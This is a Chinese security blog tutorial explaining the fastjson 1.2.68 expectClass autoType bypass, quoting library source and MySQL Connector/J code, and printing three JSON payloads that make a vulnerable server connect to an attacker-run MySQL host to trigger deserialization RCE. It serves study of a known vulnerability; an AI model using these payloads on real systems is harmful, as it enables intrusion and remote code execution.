<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="声明
本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
Fastjson <= 1.2.68 expectClass 绕过原理
当 fastjson 更新到 1.2.68 之后，大部分安全漏洞都已经封堵住了，但不排除还有人手里握着一些 0day 没有放出来。
fastjson 1.2.68 在进行反序列化的时候，会进入 ObjectDeserializer 的 deserialze 方法，而 安全人员发现 当 @type 为 java.lang.AutoCloseable 的时候会找到实现类 JavaBeanDeserializer 调用 deserialze，而 JavaBeanDeserializer 的 deserialze 方法还会继续解析得到第二个 @type 对应的值进行反序列化，并且 expectClass 则不再是 null 值，而是 java.lang.AutoCloseable。
JavaBeanDeserializer 的 deserialze 部分代码示例。
if (lexer.token() == JSONToken.LITERAL_STRING) {
    // 第二个 @type 的值
    String typeName = lexer.stringVal();
    lexer.nextToken(JSONToken.COMMA);

    if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) {
        if (lexer.token() == JSONToken.RBRACE) {
            lexer.nextToken();
            break;
        }
        continue;
    }
    
    // 这里没有获取到 deserializer
    ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName);
    Class<?> userType = null;

    if (deserializer == null) {
        // 第一个 @type 的值 
        Class<?> expectClass = TypeUtils.getClass(type);
        // 在包含 expectClass 时会绕过
        userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
        deserializer = parser.getConfig().getDeserializer(userType);
    }
    
    // 再次进行反序列化，会触发反射构造实例
    Object typedObject = deserializer.deserialze(parser, userType, fieldName);
    if (deserializer instanceof JavaBeanDeserializer) {
        JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer;
        if (typeKey != null) {
            FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey);
            if (typeKeyFieldDeser != null) {
                typeKeyFieldDeser.setValue(typedObject, typeName);
            }
        }
    }
    return (T) typedObject;
}
ParseConfig 的 checkAutoType 部分代码示例，只要第二个 @type 继承了 第一个 @type 即可触发。"><title>Java 反序列化漏洞原理（六）fastjson 1.2.68 绕过原理</title><link rel="shortcut icon" type=image/x-icon href=/><link rel=stylesheet href=/css/main.0568d3f70e9896300444ff10565468b82c2dace6b1b82bc72fba6ae51bfb0849887e0eb4ccb3cdb1c915fbe68c7000fbea631be9322fd5d0bcab56732ce7293f.css integrity="sha512-BWjT9w6YljAERP8QVlRouCwtrOaxuCvHL7pq5Rv7CEmIfg60zLPNsckV++aMcAD76mMb6TIv1dC8q1ZzLOcpPw=="></head><body a=auto><main class=page-content aria-label=Content><div class=w><div class=post-meta><a href=/>..</a><p><time datetime="2021-11-06 17:16:00 +0800 +0800">2021-11-06</time></p></div><article><h1>Java 反序列化漏洞原理（六）fastjson 1.2.68 绕过原理</h1><h2 id=声明>声明</h2><p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。</p><h2 id=fastjson--1268-expectclass-绕过原理>Fastjson &lt;= 1.2.68 expectClass 绕过原理</h2><p>当 fastjson 更新到 1.2.68 之后，大部分安全漏洞都已经封堵住了，但不排除还有人手里握着一些 0day 没有放出来。</p><p>fastjson 1.2.68 在进行反序列化的时候，会进入 <code>ObjectDeserializer</code> 的 <code>deserialze</code> 方法，而 安全人员发现 当 <code>@type</code> 为 <code>java.lang.AutoCloseable</code> 的时候会找到实现类 <code>JavaBeanDeserializer</code> 调用 <code>deserialze</code>，而 <code>JavaBeanDeserializer</code> 的 <code>deserialze</code> 方法还会继续解析得到第二个 <code>@type</code> 对应的值进行反序列化，并且 <code>expectClass</code> 则不再是 <code>null</code> 值，而是 <code>java.lang.AutoCloseable</code>。</p><p><code>JavaBeanDeserializer</code> 的 <code>deserialze</code> 部分代码示例。</p><pre tabindex=0><code>if (lexer.token() == JSONToken.LITERAL_STRING) {
    // 第二个 @type 的值
    String typeName = lexer.stringVal();
    lexer.nextToken(JSONToken.COMMA);

    if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) {
        if (lexer.token() == JSONToken.RBRACE) {
            lexer.nextToken();
            break;
        }
        continue;
    }
    
    // 这里没有获取到 deserializer
    ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName);
    Class&lt;?&gt; userType = null;

    if (deserializer == null) {
        // 第一个 @type 的值 
        Class&lt;?&gt; expectClass = TypeUtils.getClass(type);
        // 在包含 expectClass 时会绕过
        userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
        deserializer = parser.getConfig().getDeserializer(userType);
    }
    
    // 再次进行反序列化，会触发反射构造实例
    Object typedObject = deserializer.deserialze(parser, userType, fieldName);
    if (deserializer instanceof JavaBeanDeserializer) {
        JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer;
        if (typeKey != null) {
            FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey);
            if (typeKeyFieldDeser != null) {
                typeKeyFieldDeser.setValue(typedObject, typeName);
            }
        }
    }
    return (T) typedObject;
}
</code></pre><p><code>ParseConfig</code> 的 <code>checkAutoType</code> 部分代码示例，只要第二个 <code>@type</code> 继承了 第一个 <code>@type</code> 即可触发。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>if</span> (expectClass <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span>) {
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (expectClass.<span style=color:#50fa7b>isAssignableFrom</span>(clazz)) {
</span></span><span style=display:flex><span>        TypeUtils.<span style=color:#50fa7b>addMapping</span>(typeName, clazz);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> clazz;
</span></span><span style=display:flex><span>    } <span style=color:#ff79c6>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> JSONException(<span style=color:#f1fa8c>&#34;type not match. &#34;</span> <span style=color:#ff79c6>+</span> typeName <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34; -&gt; &#34;</span> <span style=color:#ff79c6>+</span> expectClass.<span style=color:#50fa7b>getName</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=fastjson--1268-利用链>Fastjson &lt;= 1.2.68 利用链</h2><p>在 black hat usa 2021 议题上，腾讯玄武实验室披露了四条利用链，分别是：</p><ol><li>Mysql connector RCE</li><li>Apache commons io read and write files</li><li>Jetty SSRF</li><li>Apache xbean-reflect RCE</li></ol><p>其中 Mysql 的利用链是因为可以构造任意 URL 使用 JDBC 连接，连接至恶意 Mysql 服务器，服务器返回的内容被 JDBC 反序列化。</p><p>Mysql connector 5.1.x</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;@type&#34;</span>: <span style=color:#f1fa8c>&#34;java.lang.AutoCloseable&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;@type&#34;</span>: <span style=color:#f1fa8c>&#34;com.mysql.jdbc.JDBC4Connection&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;hostToConnectTo&#34;</span>: <span style=color:#f1fa8c>&#34;mysql.host&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;portToConnectTo&#34;</span>: <span style=color:#bd93f9>3306</span>,
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;info&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;user&#34;</span>: <span style=color:#f1fa8c>&#34;user&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;password&#34;</span>: <span style=color:#f1fa8c>&#34;pass&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;statementInterceptors&#34;</span>: <span style=color:#f1fa8c>&#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;autoDeserialize&#34;</span>: <span style=color:#f1fa8c>&#34;true&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;NUM_HOSTS&#34;</span>: <span style=color:#f1fa8c>&#34;1&#34;</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;databaseToConnectTo&#34;</span>: <span style=color:#f1fa8c>&#34;dbname&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;url&#34;</span>: <span style=color:#f1fa8c>&#34;&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>• Mysql connector 6.0.2 or 6.0.3</p><pre tabindex=0><code>{
    &#34;@type&#34;: &#34;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&#34;,
    &#34;proxy&#34;: {
        &#34;connectionString&#34;: {
            &#34;url&#34;: &#34;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true&#34;
        }
    }
}
</code></pre><p>• Mysql connector 6.x or &lt; 8.0.20</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;@type&#34;</span>:<span style=color:#f1fa8c>&#34;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;proxy&#34;</span>:{
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;@type&#34;</span>:<span style=color:#f1fa8c>&#34;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;connectionUrl&#34;</span>:{
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;@type&#34;</span>:<span style=color:#f1fa8c>&#34;com.mysql.cj.conf.url.ReplicationConnectionUrl&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;masters&#34;</span>:[
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>&#34;host&#34;</span>:<span style=color:#f1fa8c>&#34;mysql.host&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            ],
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;slaves&#34;</span>:[
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            ],
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;properties&#34;</span>:{
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&#34;host&#34;</span>:<span style=color:#f1fa8c>&#34;mysql.host&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&#34;user&#34;</span>:<span style=color:#f1fa8c>&#34;user&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&#34;dbname&#34;</span>:<span style=color:#f1fa8c>&#34;dbname&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&#34;password&#34;</span>:<span style=color:#f1fa8c>&#34;pass&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&#34;queryInterceptors&#34;</span>:<span style=color:#f1fa8c>&#34;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&#34;autoDeserialize&#34;</span>:<span style=color:#f1fa8c>&#34;true&#34;</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=jdbc-利用链原理>JDBC 利用链原理</h2><p>我们先来看一段每一个Java 开发都要学习的 JDBC 操作数据库的示例：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>import</span> java.sql.*;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>MySQLDemo</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd;font-style:italic>final</span> String JDBC_DRIVER <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;com.mysql.jdbc.Driver&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd;font-style:italic>final</span> String DB_URL <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;jdbc:mysql://localhost:3306/test&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd;font-style:italic>final</span> String USERNAME <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;root&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd;font-style:italic>final</span> String PASSWORD <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;123456&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span>(String<span style=color:#ff79c6>[]</span> args) {
</span></span><span style=display:flex><span>        Connection conn <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span>;
</span></span><span style=display:flex><span>        Statement stmt <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span>;
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>try</span> {
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// 注册 JDBC 驱动</span>
</span></span><span style=display:flex><span>            Class.<span style=color:#50fa7b>forName</span>(JDBC_DRIVER);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// 打开链接</span>
</span></span><span style=display:flex><span>            System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;连接数据库...&#34;</span>);
</span></span><span style=display:flex><span>            conn <span style=color:#ff79c6>=</span> DriverManager.<span style=color:#50fa7b>getConnection</span>(DB_URL, USERNAME, PASSWORD);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// 执行查询</span>
</span></span><span style=display:flex><span>            System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34; 实例化Statement对象...&#34;</span>);
</span></span><span style=display:flex><span>            stmt <span style=color:#ff79c6>=</span> conn.<span style=color:#50fa7b>createStatement</span>();
</span></span><span style=display:flex><span>            String sql;
</span></span><span style=display:flex><span>            sql <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;SELECT * FROM test&#34;</span>;
</span></span><span style=display:flex><span>            ResultSet rs <span style=color:#ff79c6>=</span> stmt.<span style=color:#50fa7b>executeQuery</span>(sql);
</span></span><span style=display:flex><span>            <span style=color:#8be9fd>int</span> index <span style=color:#ff79c6>=</span> 0;
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// 展开结果集数据库</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>while</span> (rs.<span style=color:#50fa7b>next</span>()) {
</span></span><span style=display:flex><span>                <span style=color:#6272a4>// getObject 会根据字段不同的类型做不同的处理</span>
</span></span><span style=display:flex><span>                Object object <span style=color:#ff79c6>=</span> rs.<span style=color:#50fa7b>getObject</span>(index);
</span></span><span style=display:flex><span>                System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(object);
</span></span><span style=display:flex><span>                index<span style=color:#ff79c6>++</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// 完成后关闭</span>
</span></span><span style=display:flex><span>            rs.<span style=color:#50fa7b>close</span>();
</span></span><span style=display:flex><span>        } <span style=color:#ff79c6>catch</span> (Exception se) {
</span></span><span style=display:flex><span>            se.<span style=color:#50fa7b>printStackTrace</span>();
</span></span><span style=display:flex><span>        } <span style=color:#ff79c6>finally</span> {
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// 关闭资源</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>try</span> {
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (stmt <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span>) stmt.<span style=color:#50fa7b>close</span>();
</span></span><span style=display:flex><span>            } <span style=color:#ff79c6>catch</span> (SQLException ignored) {
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>try</span> {
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (conn <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span>) conn.<span style=color:#50fa7b>close</span>();
</span></span><span style=display:flex><span>            } <span style=color:#ff79c6>catch</span> (SQLException ignored) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;Goodbye!&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>其中 <code>ResultSetImpl</code> 的 <code>getObject</code> 方法会根据Mysql中字段的类型做不同的处理，源码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>@Override
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>getObject</span>(<span style=color:#8be9fd>int</span> columnIndex) <span style=color:#8be9fd;font-style:italic>throws</span> SQLException {
</span></span><span style=display:flex><span>    checkRowPos();
</span></span><span style=display:flex><span>    checkColumnBounds(columnIndex);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>int</span> columnIndexMinusOne <span style=color:#ff79c6>=</span> columnIndex <span style=color:#ff79c6>-</span> 1;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// we can&#39;t completely rely on code below because primitives have default values for null (e.g. int-&gt;0)</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>this</span>.<span style=color:#50fa7b>thisRow</span>.<span style=color:#50fa7b>getNull</span>(columnIndexMinusOne)) {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Field field <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span>.<span style=color:#50fa7b>columnDefinition</span>.<span style=color:#50fa7b>getFields</span>()<span style=color:#ff79c6>[</span>columnIndexMinusOne<span style=color:#ff79c6>]</span>;
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>switch</span> (field.<span style=color:#50fa7b>getMysqlType</span>()) {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>case</span> BIT:
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// TODO Field sets binary and blob flags if the length of BIT field is &gt; 1; is it needed at all?</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> (field.<span style=color:#50fa7b>isBinary</span>() <span style=color:#ff79c6>||</span> field.<span style=color:#50fa7b>isBlob</span>()) {
</span></span><span style=display:flex><span>                <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> data <span style=color:#ff79c6>=</span> getBytes(columnIndex);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>this</span>.<span style=color:#50fa7b>connection</span>.<span style=color:#50fa7b>getPropertySet</span>().<span style=color:#50fa7b>getBooleanProperty</span>(PropertyKey.<span style=color:#50fa7b>autoDeserialize</span>).<span style=color:#50fa7b>getValue</span>()) {
</span></span><span style=display:flex><span>                    Object obj <span style=color:#ff79c6>=</span> data;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>if</span> ((data <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span>) <span style=color:#ff79c6>&amp;&amp;</span> (data.<span style=color:#50fa7b>length</span> <span style=color:#ff79c6>&gt;=</span> 2)) {
</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>if</span> ((data<span style=color:#ff79c6>[</span>0<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>-</span>84) <span style=color:#ff79c6>&amp;&amp;</span> (data<span style=color:#ff79c6>[</span>1<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>-</span>19)) {
</span></span><span style=display:flex><span>                            <span style=color:#6272a4>// Serialized object?</span>
</span></span><span style=display:flex><span>                            <span style=color:#ff79c6>try</span> {
</span></span><span style=display:flex><span>                                ByteArrayInputStream bytesIn <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ByteArrayInputStream(data);
</span></span><span style=display:flex><span>                                ObjectInputStream objIn <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectInputStream(bytesIn);
</span></span><span style=display:flex><span>                                obj <span style=color:#ff79c6>=</span> objIn.<span style=color:#50fa7b>readObject</span>();
</span></span><span style=display:flex><span>                                objIn.<span style=color:#50fa7b>close</span>();
</span></span><span style=display:flex><span>                                bytesIn.<span style=color:#50fa7b>close</span>();
</span></span><span style=display:flex><span>                            } <span style=color:#ff79c6>catch</span> (ClassNotFoundException cnfe) {
</span></span><span style=display:flex><span>                                <span style=color:#ff79c6>throw</span> SQLError.<span style=color:#50fa7b>createSQLException</span>(Messages.<span style=color:#50fa7b>getString</span>(<span style=color:#f1fa8c>&#34;ResultSet.Class_not_found___91&#34;</span>) <span style=color:#ff79c6>+</span> cnfe.<span style=color:#50fa7b>toString</span>()
</span></span><span style=display:flex><span>                                        <span style=color:#ff79c6>+</span> Messages.<span style=color:#50fa7b>getString</span>(<span style=color:#f1fa8c>&#34;ResultSet._while_reading_serialized_object_92&#34;</span>), getExceptionInterceptor());
</span></span><span style=display:flex><span>                            } <span style=color:#ff79c6>catch</span> (IOException ex) {
</span></span><span style=display:flex><span>                                obj <span style=color:#ff79c6>=</span> data; <span style=color:#6272a4>// not serialized?</span>
</span></span><span style=display:flex><span>                            }
</span></span><span style=display:flex><span>                        } <span style=color:#ff79c6>else</span> {
</span></span><span style=display:flex><span>                            <span style=color:#ff79c6>return</span> getString(columnIndex);
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>return</span> obj;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>return</span> data;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> field.<span style=color:#50fa7b>isSingleBit</span>() <span style=color:#ff79c6>?</span> Boolean.<span style=color:#50fa7b>valueOf</span>(getBoolean(columnIndex)) : getBytes(columnIndex);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 代码省略</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>case</span> BINARY:
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>case</span> VARBINARY:
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>case</span> TINYBLOB:
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>case</span> MEDIUMBLOB:
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>case</span> LONGBLOB:
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>case</span> BLOB:
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> (field.<span style=color:#50fa7b>isBinary</span>() <span style=color:#ff79c6>||</span> field.<span style=color:#50fa7b>isBlob</span>()) {
</span></span><span style=display:flex><span>                <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> data <span style=color:#ff79c6>=</span> getBytes(columnIndex);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>this</span>.<span style=color:#50fa7b>connection</span>.<span style=color:#50fa7b>getPropertySet</span>().<span style=color:#50fa7b>getBooleanProperty</span>(PropertyKey.<span style=color:#50fa7b>autoDeserialize</span>).<span style=color:#50fa7b>getValue</span>()) {
</span></span><span style=display:flex><span>                    Object obj <span style=color:#ff79c6>=</span> data;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>if</span> ((data <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span>) <span style=color:#ff79c6>&amp;&amp;</span> (data.<span style=color:#50fa7b>length</span> <span style=color:#ff79c6>&gt;=</span> 2)) {
</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>if</span> ((data<span style=color:#ff79c6>[</span>0<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>-</span>84) <span style=color:#ff79c6>&amp;&amp;</span> (data<span style=color:#ff79c6>[</span>1<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>-</span>19)) {
</span></span><span style=display:flex><span>                            <span style=color:#6272a4>// Serialized object?</span>
</span></span><span style=display:flex><span>                            <span style=color:#ff79c6>try</span> {
</span></span><span style=display:flex><span>                                ByteArrayInputStream bytesIn <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ByteArrayInputStream(data);
</span></span><span style=display:flex><span>                                ObjectInputStream objIn <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectInputStream(bytesIn);
</span></span><span style=display:flex><span>                                obj <span style=color:#ff79c6>=</span> objIn.<span style=color:#50fa7b>readObject</span>();
</span></span><span style=display:flex><span>                                objIn.<span style=color:#50fa7b>close</span>();
</span></span><span style=display:flex><span>                                bytesIn.<span style=color:#50fa7b>close</span>();
</span></span><span style=display:flex><span>                            } <span style=color:#ff79c6>catch</span> (ClassNotFoundException cnfe) {
</span></span><span style=display:flex><span>                                <span style=color:#ff79c6>throw</span> SQLError.<span style=color:#50fa7b>createSQLException</span>(Messages.<span style=color:#50fa7b>getString</span>(<span style=color:#f1fa8c>&#34;ResultSet.Class_not_found___91&#34;</span>) <span style=color:#ff79c6>+</span> cnfe.<span style=color:#50fa7b>toString</span>()
</span></span><span style=display:flex><span>                                        <span style=color:#ff79c6>+</span> Messages.<span style=color:#50fa7b>getString</span>(<span style=color:#f1fa8c>&#34;ResultSet._while_reading_serialized_object_92&#34;</span>), getExceptionInterceptor());
</span></span><span style=display:flex><span>                            } <span style=color:#ff79c6>catch</span> (IOException ex) {
</span></span><span style=display:flex><span>                                obj <span style=color:#ff79c6>=</span> data; <span style=color:#6272a4>// not serialized?</span>
</span></span><span style=display:flex><span>                            }
</span></span><span style=display:flex><span>                        } <span style=color:#ff79c6>else</span> {
</span></span><span style=display:flex><span>                            <span style=color:#ff79c6>return</span> getString(columnIndex);
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>return</span> obj;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>return</span> data;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> getBytes(columnIndex);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// 代码省略</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
